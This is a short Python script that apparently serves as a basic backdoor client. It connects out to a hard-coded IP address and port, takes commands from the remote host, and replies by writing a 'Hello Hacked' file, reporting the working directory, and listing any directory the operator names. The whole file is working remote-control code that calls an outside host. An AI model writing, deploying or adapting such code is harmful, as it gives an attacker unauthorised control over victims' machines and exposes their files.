import socket
import os
conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host='3.17.7.232'
port=12476
conn.connect((host,port))
print("Connected...")
while 1:
	command=conn.recv(1024)
	command=command.decode()
	print("")
	if(command=="create file"):
		with open("file1.txt","w")as file:
			file.write("Hello Hacked")
		print("Completed")
	elif(command=="dir"):
		folder=str(os.getcwd())
		conn.send(folder.encode())
		print("Completed")
	elif(command=="quit"):
		conn.close()
		break
	elif(command=="allfiles"):
		user=conn.recv(5000)
		user=user.decode()
		files=os.listdir(user)
		files=str(files)
		conn.send(files.encode())
		print("Completed")

